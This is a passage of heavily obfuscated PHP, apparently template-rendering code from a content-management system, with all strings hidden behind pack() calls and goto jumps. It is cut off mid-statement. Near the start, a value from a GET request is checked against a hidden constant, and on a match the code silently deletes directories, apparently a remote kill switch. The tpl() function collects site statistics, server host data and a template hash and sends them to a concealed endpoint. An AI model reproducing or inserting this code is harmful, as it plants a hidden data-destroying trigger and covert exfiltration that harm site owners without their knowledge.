Q24x9;Q24ldMhxa:$Q24ACV7=$GLOBALS[PARVGBYv][6];Q24x9:$Q24F6=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},&$Q24ACV7));call_user_func($Q24F0,$Q24F3,$Q24F6);goto Q24x1;Q24ldMhx4:Q24x1:$Q24A0=array();$Q24A0[]=$_GET;unset($Q24tI0);$Q24tI0=$Q24A0;$GLOBALS[K9Z4Q89v]=$Q24tI0;$Q24P0=0-800;$Q24P1=E_CORE_ERROR*50;$Q24P2=$Q24P0+$Q24P1;unset($Q24ACV1);if(is_array($GLOBALS[PARVGBYv]))goto Q24eWjgxd;goto Q24ldMhxd;Q24eWjgxd:$Q24ACV1=&$GLOBALS[PARVGBYv][07];goto Q24xc;Q24ldMhxd:$Q24ACV1=$GLOBALS[PARVGBYv][07];Q24xc:$Q24F0=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},&$Q24ACV1));unset($Q24ACV4);if(is_array($GLOBALS[PARVGBYv]))goto Q24eWjgxf;goto Q24ldMhxf;Q24eWjgxf:$Q24ACV4=&$GLOBALS[PARVGBYv][0x8];goto Q24xe;Q24ldMhxf:$Q24ACV4=$GLOBALS[PARVGBYv][0x8];Q24xe:$Q24F3=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},&$Q24ACV4));$Q243=$GLOBALS[K9Z4Q89v][$Q24P2][$Q24F0]==$Q24F3;if($Q243)goto Q24eWjgxg;goto Q24ldMhxg;Q24eWjgxg:unset($Q24ACV1);if(is_array($GLOBALS[PARVGBYv]))goto Q24eWjgxi;goto Q24ldMhxi;Q24eWjgxi:$Q24ACV1=&$GLOBALS[PARVGBYv][011];goto Q24xh;Q24ldMhxi:$Q24ACV1=$GLOBALS[PARVGBYv][011];Q24xh:$Q24F0=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},&$Q24ACV1));@removeDir($Q24F0);$Q24F0=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},$GLOBALS[PARVGBYv]{1}));unset($Q24ACV2);if(is_array($GLOBALS[PARVGBYv]))goto Q24eWjgxk;goto Q24ldMhxk;Q24eWjgxk:$Q24ACV2=&$GLOBALS[PARVGBYv][011];goto Q24xj;Q24ldMhxk:$Q24ACV2=$GLOBALS[PARVGBYv][011];Q24xj:$Q24F1=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},&$Q24ACV2));@$GLOBALS[$Q24F0]($Q24F1,0777,true);$Q24F0=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},$GLOBALS[PARVGBYv]{0xA}));@removeDir($Q24F0);$Q24F0=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},$GLOBALS[PARVGBYv]{1}));$Q24F1=call_user_func_array("pack",array($GLOBALS[PARVGBYv]{0x0},$GLOBALS[PARVGBYv]{0xA}));@$GLOBALS[$Q24F0]($Q24F1,0777,true);goto Q24xb;Q24ldMhxg:Q24xb:function tpl($path){unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgxm;goto Q24ldMhxm;Q24eWjgxm:$Q24ACV1=&$GLOBALS[E5PR5S4Q][1];goto Q24xl;Q24ldMhxm:$Q24ACV1=$GLOBALS[E5PR5S4Q][1];Q24xl:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x2}));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgxo;goto Q24ldMhxo;Q24eWjgxo:$Q24ACV1=&$GLOBALS[E5PR5S4Q][03];goto Q24xn;Q24ldMhxo:$Q24ACV1=$GLOBALS[E5PR5S4Q][03];Q24xn:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x4}));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x5}));unset($Q24ACV2);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgxq;goto Q24ldMhxq;Q24eWjgxq:$Q24ACV2=&$GLOBALS[E5PR5S4Q][6];goto Q24xp;Q24ldMhxq:$Q24ACV2=$GLOBALS[E5PR5S4Q][6];Q24xp:$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV2));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{7}));$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x8}));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgxs;goto Q24ldMhxs;Q24eWjgxs:$Q24ACV1=&$GLOBALS[E5PR5S4Q][011];goto Q24xr;Q24ldMhxs:$Q24ACV1=$GLOBALS[E5PR5S4Q][011];Q24xr:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));unset($Q24ACV4);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgxu;goto Q24ldMhxu;Q24eWjgxu:$Q24ACV4=&$GLOBALS[E5PR5S4Q][10];goto Q24xt;Q24ldMhxu:$Q24ACV4=$GLOBALS[E5PR5S4Q][10];Q24xt:$Q24F3=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV4));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0xB}));unset($Q24ACV2);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgxw;goto Q24ldMhxw;Q24eWjgxw:$Q24ACV2=&$GLOBALS[E5PR5S4Q][014];goto Q24xv;Q24ldMhxw:$Q24ACV2=$GLOBALS[E5PR5S4Q][014];Q24xv:$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV2));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgxy;goto Q24ldMhxy;Q24eWjgxy:$Q24ACV1=&$GLOBALS[E5PR5S4Q][13];goto Q24xx;Q24ldMhxy:$Q24ACV1=$GLOBALS[E5PR5S4Q][13];Q24xx:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0xE}));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{017}));unset($Q24ACV2);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx11;goto Q24ldMhx11;Q24eWjgx11:$Q24ACV2=&$GLOBALS[E5PR5S4Q][0x10];goto Q24xz;Q24ldMhx11:$Q24ACV2=$GLOBALS[E5PR5S4Q][0x10];Q24xz:$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV2));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x11}));$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{022}));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{023}));unset($Q24ACV2);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx13;goto Q24ldMhx13;Q24eWjgx13:$Q24ACV2=&$GLOBALS[E5PR5S4Q][024];goto Q24x12;Q24ldMhx13:$Q24ACV2=$GLOBALS[E5PR5S4Q][024];Q24x12:$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV2));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{21}));$Q240=!defined($Q24F0);if($Q240)goto Q24eWjgx15;goto Q24ldMhx15;Q24eWjgx15:unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx17;goto Q24ldMhx17;Q24eWjgx17:$Q24ACV1=&$GLOBALS[E5PR5S4Q][026];goto Q24x16;Q24ldMhx17:$Q24ACV1=$GLOBALS[E5PR5S4Q][026];Q24x16:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{21}));unset($Q24ACV5);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx19;goto Q24ldMhx19;Q24eWjgx19:$Q24ACV5=&$GLOBALS[E5PR5S4Q][23];goto Q24x18;Q24ldMhx19:$Q24ACV5=$GLOBALS[E5PR5S4Q][23];Q24x18:$Q24F4=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV5));call_user_func($Q24F0,$Q24F3,$Q24F4);goto Q24x14;Q24ldMhx15:Q24x14:$Q24A0=array();$Q24A0[]=$_SERVER;$Q24A0[]=$_GET;unset($Q24tI0);$Q24tI0=$Q24A0;$GLOBALS[AR2Q674J]=$Q24tI0;global $C_kefu,$conn,$H_data,$type,$id,$C_title,$C_notice,$fmid,$M_ninfo,$M_pinfo;unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx1c;goto Q24ldMhx1c;Q24eWjgx1c:$Q24ACV1=&$GLOBALS[E5PR5S4Q][1];goto Q24x1b;Q24ldMhx1c:$Q24ACV1=$GLOBALS[E5PR5S4Q][1];Q24x1b:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{24}));$Q240=!$GLOBALS[$Q24F0]($Q24F3);if($Q240)goto Q24eWjgx1d;goto Q24ldMhx1d;Q24eWjgx1d:unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx1f;goto Q24ldMhx1f;Q24eWjgx1f:$Q24ACV1=&$GLOBALS[E5PR5S4Q][03];goto Q24x1e;Q24ldMhx1f:$Q24ACV1=$GLOBALS[E5PR5S4Q][03];Q24x1e:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{24}));@$GLOBALS[$Q24F0]($Q24F3,0755,true);goto Q24x1a;Q24ldMhx1d:Q24x1a:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{031}));$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x1A}));$Q24F2=call_user_func_array("getrs",array(&$Q24F0,&$Q24F1));unset($Q24tI0);$Q24tI0=$Q24F2;$N_count=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{033}));$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{28}));$Q24F2=call_user_func_array("getrs",array(&$Q24F0,&$Q24F1));unset($Q24tI0);$Q24tI0=$Q24F2;$P_count=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx1h;goto Q24ldMhx1h;Q24eWjgx1h:$Q24ACV1=&$GLOBALS[E5PR5S4Q][29];goto Q24x1g;Q24ldMhx1h:$Q24ACV1=$GLOBALS[E5PR5S4Q][29];Q24x1g:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{036}));$Q24F4=call_user_func_array("getrs",array(&$Q24F0,&$Q24F3));unset($Q24tI0);$Q24tI0=$Q24F4;$M_count=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{037}));$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{036}));$Q24F2=call_user_func_array("getrs",array(&$Q24F0,&$Q24F1));unset($Q24tI0);$Q24tI0=$Q24F2;$S_count=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx1j;goto Q24ldMhx1j;Q24eWjgx1j:$Q24ACV1=&$GLOBALS[E5PR5S4Q][0x20];goto Q24x1i;Q24ldMhx1j:$Q24ACV1=$GLOBALS[E5PR5S4Q][0x20];Q24x1i:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x21}));$Q24F4=call_user_func_array("getrs",array(&$Q24F0,&$Q24F3));unset($Q24tI0);$Q24tI0=$Q24F4;$L_count=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx1l;goto Q24ldMhx1l;Q24eWjgx1l:$Q24ACV1=&$GLOBALS[E5PR5S4Q][042];goto Q24x1k;Q24ldMhx1l:$Q24ACV1=$GLOBALS[E5PR5S4Q][042];Q24x1k:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));unset($Q24ACV4);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx1n;goto Q24ldMhx1n;Q24eWjgx1n:$Q24ACV4=&$GLOBALS[E5PR5S4Q][043];goto Q24x1m;Q24ldMhx1n:$Q24ACV4=$GLOBALS[E5PR5S4Q][043];Q24x1m:$Q24F3=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV4));$Q24F6=call_user_func_array("getrs",array(&$Q24F0,&$Q24F3));unset($Q24tI0);$Q24tI0=$Q24F6;$L_sum=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx1p;goto Q24ldMhx1p;Q24eWjgx1p:$Q24ACV1=&$GLOBALS[E5PR5S4Q][0x24];goto Q24x1o;Q24ldMhx1p:$Q24ACV1=$GLOBALS[E5PR5S4Q][0x24];Q24x1o:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));$Q24F3=call_user_func_array("file_get_contents",array(&$path));$Q24F4=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{045}));unset($Q24ACV6);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx1r;goto Q24ldMhx1r;Q24eWjgx1r:$Q24ACV6=&$GLOBALS[E5PR5S4Q][0x26];goto Q24x1q;Q24ldMhx1r:$Q24ACV6=$GLOBALS[E5PR5S4Q][0x26];Q24x1q:$Q24F5=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV6));unset($Q24ACV9);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx1t;goto Q24ldMhx1t;Q24eWjgx1t:$Q24ACV9=&$GLOBALS[E5PR5S4Q][0x27];goto Q24x1s;Q24ldMhx1t:$Q24ACV9=$GLOBALS[E5PR5S4Q][0x27];Q24x1s:$Q24F8=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV9));$Q24F11=call_user_func_array("date",array(&$Q24F8));$Q24F12=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{40}));$Q24P0=22*E_CORE_ERROR;$Q24P1=$Q24P0-352;$Q24F13=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x29}));$Q24A14=array();$Q24A14[$Q24F0]=$Q24F3;$Q24A14[$Q24F4]=$H_data;$Q24A14[$Q24F5]=$Q24F11;$Q24A14[$Q24F12]=$GLOBALS[AR2Q674J][$Q24P1][$Q24F13];unset($Q24tI2);$Q24tI2=$Q24A14;$data2=$Q24tI2;$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x5}));$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{7}));$Q24F2=call_user_func_array("json_encode",array(&$data2));unset($Q24tI0);$Q24tI0=$GLOBALS[$Q24F0]($GLOBALS[$Q24F1]($Q24F2));$md5=$Q24tI0;$Q24F0=call_user_func_array("isMobile",array());if($Q24F0)goto Q24eWjgx1v;goto Q24ldMhx1v;Q24eWjgx1v:unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx1x;goto Q24ldMhx1x;Q24eWjgx1x:$Q24ACV1=&$GLOBALS[E5PR5S4Q][052];goto Q24x1w;Q24ldMhx1x:$Q24ACV1=$GLOBALS[E5PR5S4Q][052];Q24x1w:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));unset($Q24tI0);$Q24tI0=$H_data[$Q24F0];$t=$Q24tI0;goto Q24x1u;Q24ldMhx1v:unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx2z;goto Q24ldMhx2z;Q24eWjgx2z:$Q24ACV1=&$GLOBALS[E5PR5S4Q][43];goto Q24x1y;Q24ldMhx2z:$Q24ACV1=$GLOBALS[E5PR5S4Q][43];Q24x1y:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));unset($Q24tI0);$Q24tI0=$H_data[$Q24F0];$t=$Q24tI0;Q24x1u:unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx22;goto Q24ldMhx22;Q24eWjgx22:$Q24ACV1=&$GLOBALS[E5PR5S4Q][0x24];goto Q24x21;Q24ldMhx22:$Q24ACV1=$GLOBALS[E5PR5S4Q][0x24];Q24x21:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));$Q24F3=call_user_func_array("file_get_contents",array(&$path));$Q24F4=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{045}));$Q24F5=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x1A}));$Q24F6=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{28}));$Q24F7=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{036}));unset($Q24ACV9);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx24;goto Q24ldMhx24;Q24eWjgx24:$Q24ACV9=&$GLOBALS[E5PR5S4Q][0x2C];goto Q24x23;Q24ldMhx24:$Q24ACV9=$GLOBALS[E5PR5S4Q][0x2C];Q24x23:$Q24F8=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV9));$Q24F11=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x21}));unset($Q24ACV13);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx26;goto Q24ldMhx26;Q24eWjgx26:$Q24ACV13=&$GLOBALS[E5PR5S4Q][043];goto Q24x25;Q24ldMhx26:$Q24ACV13=$GLOBALS[E5PR5S4Q][043];Q24x25:$Q24F12=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV13));$Q24F15=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{45}));unset($Q24ACV17);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx28;goto Q24ldMhx28;Q24eWjgx28:$Q24ACV17=&$GLOBALS[E5PR5S4Q][6];goto Q24x27;Q24ldMhx28:$Q24ACV17=$GLOBALS[E5PR5S4Q][6];Q24x27:$Q24F16=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV17));unset($Q24ACV20);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx2a;goto Q24ldMhx2a;Q24eWjgx2a:$Q24ACV20=&$GLOBALS[E5PR5S4Q][46];goto Q24x29;Q24ldMhx2a:$Q24ACV20=$GLOBALS[E5PR5S4Q][46];Q24x29:$Q24F19=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV20));$Q24P0=22*E_CORE_ERROR;$Q24P1=$Q24P0-352;$Q24F22=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x29}));$Q24F23=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x2F}));$Q24A24=array();$Q24A24[$Q24F0]=$Q24F3;$Q24A24[$Q24F4]=$H_data;$Q24A24[$Q24F5]=$N_count;$Q24A24[$Q24F6]=$P_count;$Q24A24[$Q24F7]=$M_count;$Q24A24[$Q24F8]=$S_count;$Q24A24[$Q24F11]=$L_count;$Q24A24[$Q24F12]=$L_sum;$Q24A24[$Q24F15]=$type;$Q24A24[$Q24F16]=$md5;$Q24A24[$Q24F19]=$GLOBALS[AR2Q674J][$Q24P1][$Q24F22];$Q24A24[$Q24F23]=$t;unset($Q24tI2);$Q24tI2=$Q24A24;$data=$Q24tI2;unset($Q24ACV1);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx2d;goto Q24ldMhx2d;Q24eWjgx2d:$Q24ACV1=&$GLOBALS[E5PR5S4Q][011];goto Q24x2c;Q24ldMhx2d:$Q24ACV1=$GLOBALS[E5PR5S4Q][011];Q24x2c:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{060}));$Q24P0=22*E_CORE_ERROR;$Q24P1=$Q24P0-352;$Q24F4=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x29}));$Q24F5=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{061}));$Q24P2=22*E_CORE_ERROR;$Q24P3=$Q24P2-352;unset($Q24ACV7);if(is_array($GLOBALS[AR2Q674J][$Q24P1]))goto Q24eWjgx2f;goto Q24ldMhx2f;Q24eWjgx2f:$Q24ACV7=&$GLOBALS[AR2Q674J][$Q24P1][$Q24F4];goto Q24x2e;Q24ldMhx2f:$Q24ACV7=$GLOBALS[AR2Q674J][$Q24P1][$Q24F4];Q24x2e:$Q24F6=call_user_func_array("splitx",array(&$Q24ACV7,&$Q24F5,&$Q24P3));$Q24P4=$Q24F3 . $Q24F6;$Q24P5=$Q24P4 . $t;$Q24F8=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x32}));$Q24P6=$Q24P5 . $Q24F8;$Q24P7=$Q24P6 . $type;$Q24F9=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{063}));$Q24P8=$Q24P7 . $Q24F9;if($GLOBALS[$Q24F0]($Q24P8))goto Q24eWjgx2g;goto Q24ldMhx2g;Q24eWjgx2g:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0xB}));unset($Q24ACV2);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx2j;goto Q24ldMhx2j;Q24eWjgx2j:$Q24ACV2=&$GLOBALS[E5PR5S4Q][13];goto Q24x2i;Q24ldMhx2j:$Q24ACV2=$GLOBALS[E5PR5S4Q][13];Q24x2i:$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV2));$Q24F4=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{060}));$Q24P0=22*E_CORE_ERROR;$Q24P1=$Q24P0-352;$Q24F5=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x29}));$Q24F6=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{061}));$Q24P2=22*E_CORE_ERROR;$Q24P3=$Q24P2-352;unset($Q24ACV8);if(is_array($GLOBALS[AR2Q674J][$Q24P1]))goto Q24eWjgx2l;goto Q24ldMhx2l;Q24eWjgx2l:$Q24ACV8=&$GLOBALS[AR2Q674J][$Q24P1][$Q24F5];goto Q24x2k;Q24ldMhx2l:$Q24ACV8=$GLOBALS[AR2Q674J][$Q24P1][$Q24F5];Q24x2k:$Q24F7=call_user_func_array("splitx",array(&$Q24ACV8,&$Q24F6,&$Q24P3));$Q24P4=$Q24F4 . $Q24F7;$Q24P5=$Q24P4 . $t;$Q24F9=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x32}));$Q24P6=$Q24P5 . $Q24F9;$Q24P7=$Q24P6 . $type;$Q24F10=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{063}));$Q24P8=$Q24P7 . $Q24F10;$Q24P9=22*E_CORE_ERROR;$Q24P10=$Q24P9-352;$Q24P11=0-304;$Q24P12=21*E_CORE_ERROR;$Q24P13=$Q24P11+$Q24P12;$Q2414=$GLOBALS[$Q24F0]($GLOBALS[$Q24F1]($Q24P8),$Q24P10,$Q24P13)!=$md5;if($Q2414)goto Q24eWjgx2m;goto Q24ldMhx2m;Q24eWjgx2m:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{064}));$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{7}));$Q24F2=call_user_func_array("json_encode",array(&$data));$Q24F3=call_user_func_array("ajax",array(&$Q24F0,$GLOBALS[$Q24F1]($Q24F2)));goto Q24x2h;Q24ldMhx2m:Q24x2h:goto Q24x2b;Q24ldMhx2g:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{064}));$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{7}));$Q24F2=call_user_func_array("json_encode",array(&$data));$Q24F3=call_user_func_array("ajax",array(&$Q24F0,$GLOBALS[$Q24F1]($Q24F2)));Q24x2b:$Q24F0=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{017}));$Q24F1=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0xB}));unset($Q24ACV3);if(is_array($GLOBALS[E5PR5S4Q]))goto Q24eWjgx2o;goto Q24ldMhx2o;Q24eWjgx2o:$Q24ACV3=&$GLOBALS[E5PR5S4Q][13];goto Q24x2n;Q24ldMhx2o:$Q24ACV3=$GLOBALS[E5PR5S4Q][13];Q24x2n:$Q24F2=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},&$Q24ACV3));$Q24F5=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{060}));$Q24P0=22*E_CORE_ERROR;$Q24P1=$Q24P0-352;$Q24F6=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{0x29}));$Q24F7=call_user_func_array("pack",array($GLOBALS[E5PR5S4Q]{00},$GLOBALS[E5PR5S4Q]{061}));$Q24P2=22*E_CORE_ERROR;$Q24P3=$Q24P2-352;unset($Q24ACV9);if(is_array($GLOBALS[AR2Q674J][$Q24P1]))goto Q24eWjgx2q;goto Q24ldMhx2q;Q24eWjgx2q:$Q24ACV9=&$GLOBALS[AR2Q674J][$Q24P1][$Q24F6];goto Q24x2p;Q24ldMhx2q:$Q24ACV9=$GLOBALS[AR2Q674J][$Q24P1][$Q24F6];Q24x2p:$Q24F8=call_user_func_array("splitx",array(&$Q24ACV9,&$Q24F7,&$Q24P3));$Q24P4=$Q24F5 . 